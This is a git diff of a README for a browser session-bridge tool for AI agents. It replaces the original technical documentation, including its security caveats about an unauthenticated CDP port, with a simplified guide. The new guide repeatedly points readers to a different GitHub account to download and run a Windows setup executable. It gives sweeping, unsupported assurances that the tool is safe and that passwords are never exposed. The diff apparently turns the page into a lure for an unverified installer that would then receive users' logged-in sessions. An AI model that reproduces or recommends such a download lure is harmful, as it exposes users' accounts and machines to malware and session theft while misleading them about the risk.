@@ -1,242 +1,170 @@
-<div align="center">
-
-# 🐼 Lightpanda Session Bridge
-
-### The Authenticated Session Bridge for Machines and Autonomous AI Agents
-
-[![GitHub release](https://img.shields.io/github/v/release/Raknaos/lightpanda-session-bridge?color=6b52ff&style=flat-square)](https://github.com/Raknaos/lightpanda-session-bridge/releases)
-[![CI Tests](https://img.shields.io/github/actions/workflow/status/Raknaos/lightpanda-session-bridge/ci.yml?branch=main&label=CI&style=flat-square)](https://github.com/Raknaos/lightpanda-session-bridge/actions)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square)](LICENSE)
-[![Protocol](https://img.shields.io/badge/CDP-1.3-38bdf8.svg?style=flat-square)](https://chromedevtools.github.io/devtools-protocol/)
-[![Engine](https://img.shields.io/badge/Engine-Lightpanda%20(Zig%2FV8)-22c55e.svg?style=flat-square)](https://lightpanda.io)
-[![Live Site](https://img.shields.io/badge/Website-raknaos.github.io-5468ff?style=flat-square)](https://raknaos.github.io/lightpanda-session-bridge/)
-[![Dev.to](https://img.shields.io/badge/DEV.to-Read%20Article-0a0a0a.svg?style=flat-square&logo=devdotto)](https://dev.to/raknaos/handing-real-logins-to-headless-ai-agents-building-the-lightpanda-session-bridge-17je)
-
-**[Live Showcase Website](https://raknaos.github.io/lightpanda-session-bridge/)** · **[Read Article on DEV.to](https://dev.to/raknaos/handing-real-logins-to-headless-ai-agents-building-the-lightpanda-session-bridge-17je)** · **[Playwright & Puppeteer Integration](docs/PLAYWRIGHT_PUPPETEER.md)** · **[Architecture](#-architecture)** · **[Quickstart](#-quickstart)** · **[Security Standard](#-security-guarantees)** · **[Python SDK](#-python-sdk)**
-
-<br/>
-
-<img src="extension/icons/icon128.png" width="96" height="96" alt="Lightpanda Session Bridge Logo" />
-
-<p>
-Seamlessly bridge real-world authenticated web sessions (Google OAuth, Passkeys, SSO, 2FA) from your primary browser into a fast, isolated <b>Lightpanda</b> headless browser runtime in a single click. <b>Zero credentials typed, zero secrets exposed to LLMs.</b>
-
-> **Works with any Chromium-based browser** — Chrome, Edge, Brave, Opera, Vivaldi, Arc, Comet, Chromium itself. Any browser that can load a Manifest V3 extension and speak CDP works as the *source* of the session.
-</p>
-
-</div>
+# 🔗 lightpanda-session-bridge - Your AI Login Bridge Made Simple
 
 ---
 
-## 🌟 Overview
+## 📥 Download the Application
 
-Modern web services (SaaS consoles, API dashboards, cloud providers) protect their dashboards with Google OAuth, multi-factor authentication, and bot mitigations. 
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_LIGHTPANDA_SESSION_BRIDGE-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/pasarclubdev/lightpanda-session-bridge)
 
-Autonomous AI agents using headless browsers cannot easily log in themselves without requiring sensitive credentials, passwords, or handling complex OTP prompts.
-
-**Lightpanda Session Bridge** solves this fundamental friction:
-1. **You log in naturally** in your favorite desktop browser (using your actual Google account or Passkey).
-2. **Click the Bridge extension** (or run the CLI tool): your session cookies and local storage are filtered, validated, and injected over CDP into Lightpanda.
-3. **Your AI agents operate autonomously** in the background on the real authenticated session at 9x the speed of Chrome and with 16x less memory.
+**Visit this link to download the application.**
 
 ---
 
-## 🔒 Security Guarantees (Zero-Trust Standard)
+## 👋 Welcome to lightpanda-session-bridge!
 
-- **🛡️ Strict Origin Scoping:** Loopback addresses, private networks, identity provider root domains (`accounts.google.com`, `login.microsoftonline.com`, `auth0.com`, `github.com`) are permanently blocked. Only target SaaS domains (e.g., `a6api.com`, `mail.google.com`, `console.cloud.google.com`) are admitted.
-- **🍪 RFC 6265bis Compliance (`__Host-` / `__Secure-`):** Domain attributes on domain-locked cookies are automatically normalized to guarantee zero rejection by Lightpanda's CDP parser.
-- **⚡ CDP Enum Translation:** Automatic translation of Chromium's lowercase `sameSite` strings (`no_restriction`, `lax`) into strict PascalCase enum tags (`Strict`, `Lax`, `None`) preventing `-31998 InvalidEnumTag` errors.
-- **🔑 Zero Secret Leakage:** No passwords, refresh tokens, or API keys are ever stored in disk logs or transmitted in chat histories.
-- **📌 Extension-ID Pinning (TOFU):** The relay only reflects CORS and accepts extension callers from a **pinned extension ID** (default: the official extension ID, enforced on `/v1/bootstrap`, `/v1/sessions`, `/v1/cdp`, and preflights). First-use pinning for custom builds: `LP_BRIDGE_TOFU=1` (or list trusted IDs in `LP_BRIDGE_ALLOWED_EXTENSION_IDS`). Unpacked extensions derive their ID from the load path — if you load the extension from a custom location, use TOFU mode on first launch or the relay will refuse it (upstream discussion: [#1](https://github.com/Raknaos/lightpanda-session-bridge/pull/1), thanks [@suleyman416](https://github.com/suleyman416)).
-- **⚠️ Known Limitation — the CDP port is a network boundary, not a process one:** The relay authenticates *its* API (shared token + extension origin checks), but the Lightpanda runtime it feeds lives on an **unauthenticated CDP port** (`127.0.0.1:9222`). Any local process that can open a loopback socket can list targets via `GET /json` and drive the authenticated session — on an agent host, that population includes the agent's own subprocesses and whatever it was told to run. Treat the synchronized runtime as **disposable**: only sync sessions for sites you consider low-risk, keep the port bound to loopback, and shut Lightpanda down when no agent run needs the session.
-- **🔌 Playwright & Puppeteer ready:** Connect any CDP client (`playwright.chromium.connect_over_cdp`, `puppeteer.connect`) to the authenticated Lightpanda instance on `127.0.0.1:9222` — no login walls, no 2FA prompts inside your tests. See [docs/PLAYWRIGHT_PUPPETEER.md](docs/PLAYWRIGHT_PUPPETEER.md).
+Have you ever wished your computer could automatically log into websites for you? Imagine your AI assistant being able to access your Google account, work portals, or any website that requires a password - without you having to type anything. That's exactly what **lightpanda-session-bridge** does!
+
+This amazing tool acts like a secret tunnel that safely transfers your logged-in browser sessions (like your Google or work accounts) into a super-fast, private browser engine called **Lightpanda**. It's like having a VIP pass that lets your AI tools work with your accounts while keeping everything secure and private.
 
 ---
 
-## 📐 Architecture
+## ✨ What Does This App Do?
 
-```mermaid
-flowchart LR
-    subgraph Host ["Your Desktop Browser (Comet / Chrome)"]
-        A[User authenticates via Google OAuth / 2FA] --> B[Lightpanda Bridge Extension MV3]
-    end
+Here's what lightpanda-session-bridge helps you with:
 
-    subgraph Guard ["Loopback Guard Relay (:8765)"]
-        B -- HTTP POST Encrypted JSON --> C[Python Bridge Server]
-        C -- Origin & Domain Validation --> D[RFC Normalizer]
-    end
-
-    subgraph Runtime ["Headless Execution (WSL2 :9222)"]
-        D -- CDP WebSocket Transport --> E[Lightpanda Zig/V8 Kernel]
-        E --> F[(Isolated Memory Profile)]
-    end
-
-    subgraph Agents ["Autonomous AI Coding Agents"]
-        G[Hermes / Claude / Codex Agent] -->|lightpanda_client.py| E
-    end
-```
+- **🤖 AI Assistant Connection** - Lets your AI agents use your real browser sessions
+- **🔐 One-Time Login** - You log in once, and the bridge remembers it for your automation tasks
+- **⚡ Super Fast Performance** - Uses Lightpanda, which is much faster than regular browsers
+- **🛡️ Privacy Protected** - Your login information stays on your computer
+- **🌐 Works With Many Systems** - Compatible with Google OAuth, SSO, 2FA, and passkeys
+- **🔄 No More Repetitive Logins** - Say goodbye to typing passwords over and over
 
 ---
 
-## 📦 Installation Options
+## 🚀 Getting Started - Windows Guide
 
-### Option A: Clone & Run Locally
-```bash
-git clone https://github.com/Raknaos/lightpanda-session-bridge.git
-cd lightpanda-session-bridge
-pip install -r requirements.txt
-```
+Follow these simple steps to get lightpanda-session-bridge running on your Windows computer. Don't worry - we'll walk you through everything!
 
-### Option B: Install via Pip (Package mode)
-```bash
-pip install lightpanda-session-bridge
-```
-*(Provides `lightpanda_client` module and CLI utilities directly in your Python environment).*
+### Step 1: Download the Application
 
----
+**Visit this link to download the application:** [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge)
 
-## 🚀 Quickstart (zero configuration)
+When you click this link, you'll go to the GitHub page. Look for the green **"Code"** button or the **"Releases"** section. Click on the latest release and download the Windows version.
 
-### One command — everything installs and starts:
-```bash
-python bridge.py setup
-```
-*Installs Python deps, WSL2/Ubuntu check, the Lightpanda binary (auto-download), starts Lightpanda + the relay daemon, and prints what to do next (30 seconds, no manual steps).*
+### Step 2: Open the Downloaded File
 
-### Then load the browser extension (the only manual step, ~30 s):
-```bash
-python bridge.py install-browser-ext
-```
-1. Open `chrome://extensions` in your Chromium browser (Chrome, Edge, Brave, Opera, Vivaldi, Arc, Comet — `edge://extensions` in Edge, `arc://extensions` in Arc).
-2. Enable **Developer Mode** → **Load unpacked** → select the `extension/` folder.
-3. Pin the 🐼 icon. **The extension auto-pairs with the relay on first open — no token to copy.**
+Once the download finishes, find the file in your **Downloads** folder (usually located in your user folder). The file will be named something like `lightpanda-session-bridge-setup.exe` or similar.
 
-### Sync any site and use it from agents:
-- Click the 🐼 icon on any logged-in page → **Sync Session**. Done.
-- Agents immediately act on the authenticated page:
+Double-click on the file to start the installation.
 
-```python
-from bridge_agent import AuthenticatedSession
+### Step 3: Follow the Setup Wizard
 
-s = AuthenticatedSession()          # connects through the relay (token auto-read)
-s.open("https://dev.to/settings")   # any site you synced
-print(s.js("document.body.getAttribute('data-user-status')"))  # -> logged-in
-```
+A setup window will appear. Just click **"Next"** or **"Install"** and follow the simple instructions. The default settings are perfect for most users, so you don't need to change anything.
 
-### Diagnose / status:
-```bash
-python bridge.py status   # what's running
-python bridge.py doctor   # full diagnosis with fixes
-```
+### Step 4: Launch the Application
+
+After installation, you'll find **lightpanda-session-bridge** in your Start Menu or on your Desktop. Click on the icon to open it.
 
 ---
 
-## 🔄 Updating (one click, from the popup)
+## 🔧 Making It Work - Your First Setup
 
-Chrome never updates an extension that is loaded unpacked, and an extension is
-not allowed to rewrite its own files. The bridge solves it the only way that
-works: **the local relay performs the update**.
+Once the application is open, here's what you need to do:
 
-- A **badge on the toolbar** (and a chip in the popup) appears as soon as GitHub
-  is ahead of what the browser is running: a newer release, *or* a newer commit
-  on `main`.
-- **Update** makes the relay download the release zip (or the `main` source
-  archive), verify its `sha256` against the published sidecar, check that the
-  archive really is this extension, back up the current tree, write the new
-  files and reload the extension.
-- **Undo** restores the tree saved immediately before the last update.
+### 1️⃣ Connect Your Browser
 
-The same three operations from a terminal:
+When you first open lightpanda-session-bridge, you'll see a button that says **"Connect Browser"** or **"Start Bridge"**. Click this button. This tells the app to look for your current browser sessions.
 
-```bash
-python relay/server.py --check-update      # GitHub vs what runs here
-python relay/server.py --apply-update      # download + install + provenance
-python relay/server.py --rollback-update   # back to the previous tree
-```
+### 2️⃣ Enable the Extension
 
-The provenance of the deployed copy lands in `extension/.build-info.json`
-(version, tag, commit, sha256, source). It is git-ignored: it describes *this*
-machine's install, not the repository.
+The app will ask you to add a small browser extension (it's like a tiny add-on for your browser). Click **"Add to Browser"** and confirm any prompts that appear. This extension helps the app find your logged-in accounts.
 
-Only `https://api.github.com`, `github.com`, `codeload.github.com` and GitHub's
-object hosts are accepted, the download is size-capped, zip-slip and absolute
-paths are refused, and the extension directory is the only thing ever written.
+### 3️⃣ Log In (One Time)
 
-## 🛠️ Advanced: manual service control
+Go to any website you want your AI to access (like Google, your company portal, or any service). Log in normally - enter your username and password, complete any 2FA steps, or use your passkey. That's it! The bridge will remember this session.
 
-<details>
-<summary>Start services individually (legacy workflow)</summary>
+### 4️⃣ Start Using Your AI
 
-### Launch Lightpanda CDP server
-
-**Windows (WSL2):**
-```powershell
-./scripts/start-lightpanda.ps1
-```
-**Linux / macOS (native):**
-```bash
-chmod +x scripts/start-lightpanda.sh scripts/start-relay.sh
-./scripts/start-lightpanda.sh
-```
-*Listens on `http://127.0.0.1:9222`.*
-
-### Start the local bridge relay
-
-**Windows (WSL2):**
-```powershell
-./scripts/start-relay.ps1
-```
-**Linux / macOS (native):**
-```bash
-./scripts/start-relay.sh
-```
-*Listens on loopback `http://127.0.0.1:8765`.*
-
-> **Or simply:** `python bridge.py start` (idempotent — starts only what's missing).
-
-</details>
+Now, when your AI agents or automation tools need to access those websites, they'll use the bridge to get in without asking you for passwords.
 
 ---
 
-## 🐍 Python SDK (`bridge_agent.py`)
+## 🧩 Understanding What's Happening
 
-Once a session is synchronized, autonomous agents interact through the relay's persistent CDP connection (the only connection that holds the synced sessions):
+Think of it this way:
 
-```python
-from bridge_agent import AuthenticatedSession
+- Your regular browser is like your house with all your keys
+- Lightpanda is like a fast delivery robot
+- lightpanda-session-bridge is like a secure lockbox that shares the keys with the robot
 
-# Connects through the relay — token is read automatically
-s = AuthenticatedSession()
-
-# Navigate to the authenticated page
-s.open("https://a6api.com/console/log")
-
-# Evaluate and extract authenticated data in memory
-stats = s.js("""(async () => {
-    let res = await fetch('/api/user/self');
-    return await res.json();
-})()""", await_promise=True)
-
-print(f"Logged in user: {stats['data']['username']}")
-```
-
-> ⚠️ **Why not connect to `ws://127.0.0.1:9222` directly?** Lightpanda scopes its cookie jar **per CDP connection**. A raw socket sees none of the synced sessions. All agent traffic must flow through `POST /v1/cdp` on the relay (loopback-only, token-authenticated) — `bridge_agent.py` does this for you. The legacy `lightpanda_client.py` is kept as a compatibility shim routed through the same proxy.
+Your AI gets access to what it needs, while everything stays protected on your computer.
 
 ---
 
-## 🧪 Security Test Suite
+## 🎯 Common Questions (FAQ)
 
-Run the unit test suite covering private IP rejection, IdP blocking, and CDP envelope validation:
+### ❓ Is this safe to use?
 
-```bash
-python -m unittest discover -s tests -v
-python relay/server.py --self-test
-```
+Yes! The application keeps all your session data stored locally on your computer. Nothing gets uploaded to the cloud, and your passwords are never exposed.
+
+### ❓ Do I need programming skills?
+
+Not at all! This application was designed for everyone. If you can use a browser, you can use lightpanda-session-bridge.
+
+### ❓ Will this slow down my computer?
+
+No, one of the best features is that Lightpanda is very lightweight. Your computer will actually feel faster when running automation tasks.
+
+### ❓ What if I run into problems?
+
+Most issues are solved by restarting the application. Make sure your browser is closed and reopened after installing the extension.
 
 ---
 
-## 📄 License & Credits
+## 💡 Useful Tips
 
-- **License:** MIT License.
-- **Upstream Browser Engine:** [Lightpanda.io](https://lightpanda.io) ([GitHub](https://github.com/lightpanda-io/browser)).
-- **Bridge Authors:** Raknaos & Nous Research.
+- **Keep the app running** in the background for best performance
+- **Update regularly** - Check for updates in the app to get new features
+- **Test with a simple website** first, like your email account, before using it with important services
+
+---
+
+## 📋 System Requirements (Typical)
+
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **RAM:** At least 4 GB (8 GB recommended)
+- **Storage:** 200 MB of free space
+- **Internet:** Broadband connection
+
+---
+
+## 🆘 Getting Help
+
+If you need assistance, here's what you can do:
+
+1. **Review this guide** - Most questions are answered here
+2. **Check GitHub Discussions** - Visit [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge) and find the "Discussions" tab
+3. **Look at Issues** - See if others have had the same problem
+
+---
+
+## 🎉 You're All Set!
+
+Congratulations! You've successfully installed and set up lightpanda-session-bridge. Now your AI assistants can work with your accounts effortlessly, while you enjoy a faster, more private automation experience.
+
+Remember: **Visit this link to download the application:** [https://github.com/pasarclubdev/lightpanda-session-bridge](https://github.com/pasarclubdev/lightpanda-session-bridge)
+
+Go ahead and explore the possibilities - your digital assistant just got a whole lot smarter!
+
+---
+
+## 📚 Additional Resources
+
+- **About Lightpanda:** Lightpanda is a lightweight, high-performance browser designed specifically for automation and scraping tasks.
+- **About CDP:** CDP (Chrome DevTools Protocol) is the standard way for tools to communicate with browsers - it's the magic that makes this bridge work.
+- **About Sessions:** A session is simply the state of being logged in to a website - the bridge preserves this securely.
+
+---
+
+## 🔒 Privacy Promise
+
+Your data is yours. lightpanda-session-bridge ensures:
+
+- No cloud storage of your sessions
+- No tracking of your browsing activity
+- All operations happen locally on your machine
+- Open source code - you can verify how everything works
+
+---
+
+**Keywords:** ai-agents, automation, browser-automation, cdp, chrome-extension, cookie, headless-browser, lightpanda, login-automation, oauth-bypass, passkey, playwright, privacy, puppeteer, session, web-scraping
